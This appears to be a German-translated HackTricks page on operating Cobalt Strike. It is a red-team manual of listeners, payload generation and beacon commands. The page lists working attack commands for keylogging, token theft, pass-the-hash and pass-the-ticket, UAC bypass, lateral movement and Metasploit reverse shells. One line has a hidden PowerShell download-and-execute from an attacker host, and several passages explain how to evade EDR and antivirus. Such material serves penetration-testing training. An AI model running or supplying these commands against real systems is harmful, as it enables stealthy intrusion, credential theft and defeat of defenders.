# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` dann kannst du auswählen, wo gelauscht werden soll, welche Art von beacon verwendet werden soll (http, dns, smb...) und mehr.

### Peer2Peer Listeners

Die beacons dieser Listener müssen nicht direkt mit dem C2 kommunizieren; sie können über andere beacons mit ihm kommunizieren.

`Cobalt Strike -> Listeners -> Add/Edit` dann musst du die TCP- oder SMB-beacons auswählen

* The **TCP beacon setzt einen Listener auf dem ausgewählten Port**. Um eine Verbindung zu einem TCP beacon herzustellen, benutze den Befehl `connect <ip> <port>` von einem anderen beacon
* The **smb beacon lauscht auf einem pipename mit dem ausgewählten Namen**. Um eine Verbindung zu einem SMB beacon herzustellen, musst du den Befehl `link [target] [pipe]` verwenden.

### Payloads erzeugen & hosten

#### Payloads in Dateien erzeugen

`Attacks -> Packages ->`

* **`HTMLApplication`** für HTA-Dateien
* **`MS Office Macro`** für ein Office-Dokument mit einem Makro
* **`Windows Executable`** für eine .exe, .dll oder Service-.exe
* **`Windows Executable (S)`** für eine **stageless** .exe, .dll oder Service-.exe (besser stageless als staged, weniger IoCs)

#### Payloads generieren & hosten

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dies erzeugt ein Script/Executable, um den beacon von Cobalt Strike herunterzuladen, in Formaten wie: bitsadmin, exe, powershell und python

#### Payloads hosten

Wenn du die Datei, die du hosten möchtest, bereits auf einem Webserver hast, gehe einfach zu `Attacks -> Web Drive-by -> Host File` und wähle die zu hostende Datei sowie die Webserver-Konfiguration aus.

### Beacon-Optionen

<details>
<summary>Beacon-Optionen und Befehle</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Ein custom agent muss nur das Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) sprechen, um sich zu registrieren/check-in und Tasks zu empfangen. Implementiere dieselben URIs/headers/metadata crypto, die im profile definiert sind, um die Cobalt Strike UI für Tasking und Output wiederzuverwenden.
- Ein Aggressor Script (z. B. `CustomBeacon.cna`) kann die Payload-Generierung für den non-Windows beacon kapseln, sodass Operatoren den listener auswählen und ELF payloads direkt aus der GUI erzeugen können.
- Beispielhafte Linux-Task-Handler, die dem Team Server exposed werden: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, und `exit`. Diese map zu task IDs, die vom Team Server erwartet werden, und müssen server-side implementiert sein, um Output im richtigen Format zurückzugeben.
- BOF-Support auf Linux kann hinzugefügt werden, indem Beacon Object Files in-process mit [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) geladen werden (unterstützt auch Outflank-style BOFs), was modularen post-exploitation erlaubt, innerhalb des Kontextes/der Privilegien des implants zu laufen, ohne neue Prozesse zu spawnen.
- Betten Sie einen SOCKS-Handler in den custom beacon ein, um Pivoting-Parität mit Windows Beacons zu behalten: wenn der Operator `socks <port>` ausführt, sollte das implant einen lokalen Proxy öffnen, um Operator-Tooling durch den kompromittierten Linux-Host in interne Netzwerke zu routen.

## Opsec

### Execute-Assembly

Der **`execute-assembly`** verwendet einen **sacrificial process** und remote process injection, um das angegebene Programm auszuführen. Das ist sehr auffällig, da beim Injizieren in einen Prozess bestimmte Win APIs verwendet werden, die von jedem EDR überwacht werden. Es gibt jedoch einige custom Tools, die verwendet werden können, um etwas im selben Prozess zu laden:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kannst du auch BOF (Beacon Object Files) verwenden: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Das agressor script `https://github.com/outflanknl/HelpColor` erstellt den `helpx` Befehl in Cobalt Strike, der Farben in Befehlen anzeigt, um zu kennzeichnen, ob sie BOFs (green), Frok&Run (yellow) oder ähnliches sind, oder ob sie ProcessExecution, injection oder ähnliches (red) sind. Das hilft einzuschätzen, welche Befehle stealthier sind.

### Act as the user

Du könntest Events wie `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` prüfen:

- Security EID 4624 - Überprüfe alle interaktiven Logons, um die üblichen Betriebszeiten zu kennen.
- System EID 12,13 - Überprüfe die Häufigkeit von Shutdown/Startup/Sleep.
- Security EID 4624/4625 - Überprüfe eingehende gültige/ungültige NTLM-Versuche.
- Security EID 4648 - Dieses Ereignis entsteht, wenn plaintext credentials zum Logon verwendet werden. Wenn ein Prozess es erzeugt hat, könnte die Binary die Credentials im Klartext in einer config file oder im Code enthalten.

Beim Verwenden von `jump` aus cobalt strike ist es besser, die `wmi_msbuild`-Methode zu nutzen, damit der neue Prozess legitimer aussieht.

### Use computer accounts

Es ist üblich, dass Verteidiger merkwürdige Verhaltensweisen von Benutzern überwachen und service accounts sowie computer accounts wie `*$` aus ihrem Monitoring ausschließen. Du kannst diese Accounts für lateral movement oder privilege escalation nutzen.

### Use stageless payloads

Stageless payloads sind weniger auffällig als staged, weil sie keine zweite Stage vom C2-Server herunterladen müssen. Das bedeutet, dass sie nach der initialen Verbindung keinen Netzwerktraffic mehr erzeugen, was die Erkennung durch netzwerkbasierte Verteidigungen erschwert.

### Tokens & Token Store

Sei vorsichtig beim Stehlen oder Erzeugen von Tokens, da es möglich ist, dass ein EDR alle Tokens aller Threads enumeriert und ein **Token belonging to a different user** oder sogar SYSTEM im Prozess findet.

Deshalb erlaubt es, Tokens **per beacon** zu speichern, sodass nicht jedes Mal dasselbe Token erneut gestohlen werden muss. Das ist nützlich für lateral movement oder wenn du ein gestohlenes Token mehrfach verwenden musst:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Beim lateralen Vorgehen ist es normalerweise besser, ein Token zu **stehlen** als ein neues zu generieren oder einen pass the hash-Angriff durchzuführen.

### Guardrails

Cobalt Strike hat eine Funktion namens **Guardrails**, die hilft, die Nutzung bestimmter Befehle oder Aktionen zu verhindern, die von Verteidigern entdeckt werden könnten. Guardrails können so konfiguriert werden, dass sie spezifische Befehle blockieren, wie `make_token`, `jump`, `remote-exec` und andere, die häufig für lateral movement oder privilege escalation verwendet werden.

Außerdem enthält das Repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) einige Checks und Ideen, die du vor der Ausführung eines Payloads berücksichtigen könntest.

### Tickets encryption

In einer AD-Umgebung sei vorsichtig mit der Verschlüsselung der Tickets. Standardmäßig verwenden einige Tools RC4-Verschlüsselung für Kerberos-Tickets, was weniger sicher ist als AES; aktuelle Umgebungen nutzen standardmäßig AES. Das kann von Verteidigern erkannt werden, die nach schwachen Verschlüsselungsalgorithmen überwachen.

### Avoid Defaults

Wenn du Cobalt Strike verwendest, haben die SMB-Pipes standardmäßig den Namen `msagent_####` und `status_####`. Ändere diese Namen. Du kannst die Namen der bestehenden Pipes in Cobalt Strike mit dem Befehl `ls \\.\pipe\` prüfen.

Außerdem wird bei SSH-Sitzungen eine Pipe namens `\\.\pipe\postex_ssh_####` erstellt. Ändere sie mit `set ssh_pipename "<new_name>";`.

Auch bei postex exploitation-Angriffen können die Pipes `\\.\pipe\postex_####` mit `set pipename "<new_name>"` geändert werden.

In Cobalt Strike profiles kannst du außerdem Dinge wie die folgenden anpassen:

- Vermeiden, `rwx` zu verwenden
- Wie das process injection Verhalten funktioniert (welche APIs verwendet werden) im `process-inject {...}` block
- Wie "fork and run" im `post-ex {…}` block funktioniert
- Die sleep time
- Die maximale Größe von Binaries, die in memory geladen werden dürfen
- Den memory footprint und DLL-Inhalt im `stage {...}` block
- Den network traffic

### Bypass memory scanning

Einige EDRs scannen den Speicher nach bekannten Malware-Signaturen. Cobalt Strike erlaubt es, die `sleep_mask`-Funktion als BOF zu modifizieren, die das backdoor im Speicher verschlüsseln kann.

### Noisy proc injections

Beim Injizieren von Code in einen Prozess ist das normalerweise sehr auffällig, weil **kein regulärer Prozess normalerweise diese Aktion ausführt und weil die Methoden dafür sehr begrenzt sind**. Daher kann es von verhaltensbasierten Erkennungssystemen entdeckt werden. Außerdem kann es von EDRs erkannt werden, die nach **Threads suchen, die Code enthalten, der nicht auf der Festplatte gespeichert ist** (obwohl Prozesse wie Browser mit JIT das häufig haben). Beispiel: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Beim Erzeugen eines neuen Prozesses ist es wichtig, eine **normale parent-child**-Beziehung zwischen Prozessen beizubehalten, um Erkennung zu vermeiden. Wenn svchost.exec iexplorer.exe startet, wirkt das verdächtig, da svchost.exe unter normalen Windows-Bedingungen nicht Parent von iexplorer.exe ist.

Wenn ein neuer beacon in Cobalt Strike gestartet wird, wird standardmäßig ein Prozess mit **`rundll32.exe`** erstellt, um den neuen listener auszuführen. Das ist nicht sehr stealthy und kann leicht von EDRs entdeckt werden. Außerdem wird `rundll32.exe` ohne Argumente gestartet, was es noch verdächtiger macht.

Mit dem folgenden Cobalt Strike-Befehl kannst du einen anderen Prozess angeben, um den neuen beacon zu spawnen, wodurch er weniger leicht zu entdecken ist:
```bash
spawnto x86 svchost.exe
```
Du kannst auch diese Einstellung **`spawnto_x86` und `spawnto_x64`** in einem Profil ändern.

### Weiterleitung des Angreifer-Traffics

Angreifer müssen manchmal in der Lage sein, Tools lokal auszuführen, sogar auf Linux-Maschinen, und den Traffic der Opfer so umzuleiten, dass er das Tool erreicht (z. B. NTLM relay).

Außerdem ist es manchmal bei einem pass-the.hash- oder pass-the-ticket-Angriff für den Angreifer diskreter, **diesen Hash oder dieses Ticket lokal in seinen eigenen LSASS-Prozess einzufügen** und dann davon aus zu pivotieren, anstatt den LSASS-Prozess einer Opfermaschine zu verändern.

Allerdings musst du bei dem erzeugten Traffic **vorsichtig sein**, da du möglicherweise ungewöhnlichen Traffic (Kerberos?) von deinem backdoor-Prozess sendest. Dafür könntest du zu einem Browserprozess pivotieren (obwohl du beim Injizieren in einen Prozess erwischt werden könntest, also überlege dir eine möglichst unauffällige Methode).


### Vermeidung von AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Vergiss nicht, das aggressive Script `dist-pipe\artifact.cna` zu laden, damit Cobalt Strike die Ressourcen von der Festplatte verwendet, die wir wollen, und nicht die bereits geladenen.

#### Resource Kit

Der ResourceKit-Ordner enthält die Vorlagen für die scriptbasierten Payloads von Cobalt Strike, einschließlich PowerShell, VBA und HTA.

Wenn du [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) mit den Vorlagen verwendest, kannst du herausfinden, was dem Defender (in diesem Fall AMSI) nicht gefällt, und es anpassen:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Wenn man die erkannten Zeilen ändert, kann man eine Vorlage erstellen, die nicht erkannt wird.

Vergiss nicht, das aggressive Skript `ResourceKit\resources.cna` zu laden, um Cobalt Strike anzuweisen, die Ressourcen von der Festplatte zu verwenden, die wir wollen, und nicht die geladenen.

#### Function hooks | Syscall

Function hooking ist eine sehr häufige Methode von EDRs, um bösartige Aktivitäten zu erkennen. Cobalt Strike erlaubt es, diese Hooks zu umgehen, indem man **syscalls** statt der standardmäßigen Windows API-Aufrufe verwendet (mit der **`None`**-Konfiguration), oder die `Nt*`-Version einer Funktion mit der **`Direct`**-Einstellung nutzt, oder einfach über die `Nt*`-Funktion springt mit der **`Indirect`**-Option im malleable profile. Je nach System kann eine Option weniger auffällig sein als die andere.

Das kann im Profil oder mittels des Befehls **`syscall-method`** gesetzt werden.

Das kann jedoch auch auffällig sein.

Eine von Cobalt Strike bereitgestellte Möglichkeit, function hooks zu umgehen, ist, diese Hooks mit [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) zu entfernen.

Du kannst auch prüfen, welche Funktionen gehookt sind, mit [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) oder [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Verschiedene Cobalt Strike-Befehle</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referenzen

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42-Analyse der Cobalt Strike Metadatenverschlüsselung](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC-Tagebuch zu Cobalt Strike-Traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
